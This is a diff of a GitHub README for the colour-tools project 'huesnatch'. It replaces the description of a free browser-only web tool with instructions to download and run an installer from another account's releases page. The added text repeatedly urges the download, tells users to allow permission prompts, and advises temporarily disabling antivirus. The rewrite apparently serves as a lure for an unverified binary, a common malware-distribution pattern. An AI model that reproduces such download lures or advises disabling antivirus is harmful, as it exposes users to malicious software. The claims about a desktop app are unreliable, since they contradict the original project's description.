@@ -1,126 +1,147 @@
-# 🎨 Huesnatch - Professional Color Tools
+# 🎨 huesnatch - Easy Color Tools for Everyone
 
-[![Website](https://img.shields.io/badge/Website-huesnatch.com-blue)](https://huesnatch.com)
-[![Free](https://img.shields.io/badge/Price-100%25_Free-brightgreen)](https://huesnatch.com)
-[![No Login](https://img.shields.io/badge/Login-Not_Required-orange)](https://huesnatch.com)
+[![Download huesnatch](https://img.shields.io/badge/Download-huesnatch-brightgreen?style=for-the-badge)](https://github.com/gree04104-sketch/huesnatch/releases)
 
 ---
 
-## 🚀 **Try It Now → [huesnatch.com](https://huesnatch.com)** ← Click Here
+## 🖼️ What is huesnatch?
+
+huesnatch is a free software that helps you work with colors. Whether you are designing a website, creating graphics, or just want to explore colors, huesnatch has tools to make it simple. You can pick colors from images or URLs, create smooth color gradients, and even see how colors look to people with color blindness. No sign-up, no cost—just download and use.
+
+This app suits anyone interested in colors: designers, developers, students, or hobbyists. You don’t need any special skills to get started.
 
 ---
 
-## ✨ What is Huesnatch?
+## 💻 System Requirements
 
-**Huesnatch** is a complete suite of **6+ professional color tools** that run entirely in your browser. **Nothing is uploaded to any server.** Your images stay on your device.
+Make sure your computer meets these requirements before installing huesnatch:
 
-Used daily by:
-- 👨‍💻 Web Developers
-- 🎨 Graphic Designers  
-- 📊 Brand Managers
-- 🧑‍🏫 Students & Teachers
+- **Windows**: Windows 10 or later, 4 GB RAM, 500 MB free disk space
+- **Mac**: macOS 10.13 (High Sierra) or later, 4 GB RAM, 500 MB free disk space
+- **Linux**: Any modern distro with a standard desktop environment, 4 GB RAM, 500 MB free disk space
 
----
-
-## 🛠️ All Tools at a Glance
-
-| Tool | What It Does | Try It |
-|------|-------------|--------|
-| **Image Color Picker** | Extract palettes from any JPG/PNG | [→ Live Demo](https://huesnatch.com/get-image-color.html) |
-| **Color Image Generator** | Create gradient/pattern backgrounds instantly | [→ Live Demo](https://huesnatch.com/color-image-generator.html) |
-| **Explore Palettes** | Browse 1000+ community color schemes | [→ Live Demo](https://huesnatch.com/palettes.html) |
-| **Visualize in UI** | See palettes applied to mockups & dashboards | [→ Live Demo](https://huesnatch.com/visualize-palettes.html) |
-| **Color Matching Game** | Play an interesting Color Game | [→ Live Demo](https://huesnatch.com/color-learning-game.html) |
-| **Web Color Extractor** | Get brand colors from any website URL | [→ Live Demo](https://huesnatch.com/website-color-extractor.html) |
-| **Color Blind Simulator** | See your designs with 8+ deficiency types | [→ Live Demo](https://huesnatch.com/color-blind-simulator.html) |
+You will need an internet connection to download the software. The app works offline when running.
 
 ---
 
-## 📸 See It In Action
+## 🚀 Getting Started
 
-<img width="1896" height="867" alt="Huesnatch-A free color tool" src="https://github.com/user-attachments/assets/3f6ffbf9-168c-4257-88f5-19a51139601b" />
+Follow these steps to download and run huesnatch:
 
----
-
-## 💡 Why Designers & Developers Choose Huesnatch
-
-✅ **100% Free Forever** – No paid tiers, no credits  
-✅ **Zero Login Required** – Open and use instantly  
-✅ **Privacy First** – All processing happens in your browser  
-✅ **6+ Professional Tools** – Everything in one place  
-✅ **Multiple Color Formats** – HEX, RGB, HSL, CMYK, LAB, XYZ  
-✅ **Export Anywhere** – Copy codes, download palettes as images  
-
----
-
-## 📖 How to Use (With Examples)
-
-### 🔹 Extract Colors from a Competitor's Website
-1. Visit [huesnatch.com](https://huesnatch.com)
-2. Click **"Web Color Extractor"**
-3. Paste any URL (example: `apple.com`)
-4. Get instant HEX codes of their entire brand palette
-
-### 🔹 Create a Palette from a Photo
-1. Go to **"Image Color Picker"**
-2. Upload any photograph
-3. Receive 5-8 dominant colors instantly
-4. Copy codes or download palette image
-
-### 🔹 Test Your Designs for Accessibility
-1. Use **"Color Blind Simulator"**
-2. Upload your UI screenshot
-3. See how it looks for protanopia, deuteranopia, tritanopia
+1. Click the big green **Download huesnatch** button at the top or [visit this page](https://github.com/gree04104-sketch/huesnatch/releases) to download the installer.
+2. On the releases page, look for the latest version. Pick the installer for your computer:
+   - For Windows, the file usually ends with `.exe`
+   - For Mac, look for `.dmg` or `.pkg`
+   - For Linux, you may find `.AppImage` or `.deb`
+3. Save the installer file to your computer.
+4. Double-click the installer file to start the setup. If your system asks for permission, allow it.
+5. Follow the on-screen instructions to complete the installation. If asked, choose the default options.
+6. When the installation finishes, you can start huesnatch from your desktop or start menu.
 
 ---
 
-## 🌐 Browser Support
+## 📥 Download & Install
 
-| Chrome | Firefox | Safari | Edge | Opera |
-|--------|---------|--------|------|-------|
-| ✅ | ✅ | ✅ | ✅ | ✅ |
+You can get huesnatch from its official GitHub releases page:
 
-*Mobile browsers fully supported*
+[![Download huesnatch](https://img.shields.io/badge/Download-huesnatch-brightgreen?style=for-the-badge)](https://github.com/gree04104-sketch/huesnatch/releases)
 
----
+The page lists all past and current versions. Choose the latest stable release for best results. Clicking on a release version opens the files for download. Select the file that matches your operating system.
 
-## ❓ Frequently Asked Questions
-
-**Q: Do you store my images or website data?**  
-A: **No.** Everything runs locally in your browser. We never see your uploads.
-
-**Q: Is there a paid version?**  
-A: **No.** All tools are free forever. No subscription, no credits.
-
-**Q: Can I use Huesnatch commercially?**  
-A: **Yes.** For client work, your own projects, anything.
-
-**Q: Do I need to create an account?**  
-A: **No account required.** Just open and use.
+Once downloaded, run the installer and follow the prompts to install the software. The installation is straightforward and does not require technical knowledge.
 
 ---
 
-## 📣 Spread the Word
+## 🎯 Key Features
 
-If Huesnatch helps you, consider:
+huesnatch offers several tools that make working with colors easier:
 
-⭐ Starring this repository  
-🐦 Sharing on [Twitter](https://twitter.com)  
-👨‍💻 Telling a designer friend  
+- **Palette Extraction:** Load any image or website URL and automatically get a color palette from it.
+- **Color Blindness Simulator:** See how your color choices appear to people with different types of color blindness.
+- **Gradient Generator:** Create smooth color gradients for backgrounds or designs quickly.
+- **Color Picker:** Pick exact colors from images and get their CSS color codes.
+- **No Login Required:** Use the app instantly without creating an account or giving personal information.
+- **Free and Open:** 100% free to use with ongoing updates and improvements.
+
+These features provide practical help for tasks like web design, accessibility checks, or creative projects.
 
 ---
 
-## 📄 License
+## 🧰 How to Use huesnatch
 
-MIT License – Free for personal and commercial use.
+Here’s a simple guide to start using each main tool inside huesnatch:
+
+### Palette Extraction
+
+1. Open huesnatch.
+2. Click on the "Palette Extraction" tab.
+3. Upload an image from your computer or enter a URL.
+4. Wait a few seconds. The app shows you a palette based on the main colors of the image.
+5. You can click on any color to copy its code for use elsewhere.
+
+### Color Blindness Simulator
+
+1. Go to the "Color Blindness" section.
+2. Upload your image or your design screenshot.
+3. Choose from different color blindness types like Deuteranopia or Protanopia.
+4. The app will adjust the colors to simulate how someone with that condition sees them.
+5. Use this to make your color choices more accessible.
+
+### Gradient Generator
+
+1. Select the "Gradients" tool.
+2. Pick two or more colors by clicking color squares or entering codes.
+3. Adjust the direction or spread of the gradient using simple sliders.
+4. Preview your gradient instantly.
+5. Copy the CSS code to use the gradient in your web design.
+
+### Color Picker
+
+1. Open the "Color Picker" tab.
+2. Load an image file.
+3. Click anywhere on the image to pick a color.
+4. The color code appears immediately. You can copy it for your projects.
 
 ---
 
-## 🔗 **Start Using Huesnatch Now → [huesnatch.com](https://huesnatch.com)** ← No login, 100% free
+## 🔧 Troubleshooting
 
+If you have any problems running huesnatch, try these steps:
 
-<img width="1872" height="850" alt="Screenshot 2026-02-12 013342" src="https://github.com/user-attachments/assets/1e1f32de-94c8-4570-83a7-c17c54808154" />
+- Make sure your operating system meets the minimum requirements.
+- If the app won’t start, try reinstalling it.
+- Check you have enough disk space and memory.
+- Disable any antivirus temporarily if you suspect it blocks the app.
+- Restart your computer if the app acts strangely.
+- If issues continue, visit the GitHub repository page and check the Issues section for similar problems.
 
-<img width="1486" height="756" alt="extract-image-color" src="https://github.com/user-attachments/assets/d5e64bc7-99fd-4233-a7ea-146bbd2e1fd4" />
+---
 
-<img width="1857" height="747" alt="free-color-palettes" src="https://github.com/user-attachments/assets/da9dc0ea-a171-4e92-a96d-034255e6c49d" />
+## 📌 Additional Resources
+
+- Visit the GitHub repository: [https://github.com/gree04104-sketch/huesnatch](https://github.com/gree04104-sketch/huesnatch)
+- Learn basic color concepts with the built-in tutorials.
+- Follow the community on GitHub to stay updated on new features.
+
+---
+
+## 📝 About This App
+
+huesnatch was created to make color tools accessible to everyone. Its goal is to combine professional features with a simple interface. The app supports designers and developers who want to create better, more accessible color schemes without confusion or cost.
+
+---
+
+## 🗂️ Topics and Keywords
+
+This project covers important areas such as:
+
+- Accessibility
+- Color Blind Simulator
+- Color Palette Tools
+- Design Tools
+- Developer Tools
+- Image Color Picker
+- UX Tools
+- Web Design
+
+If you use huesnatch, you join a group of users who value clear colors and easy design help.
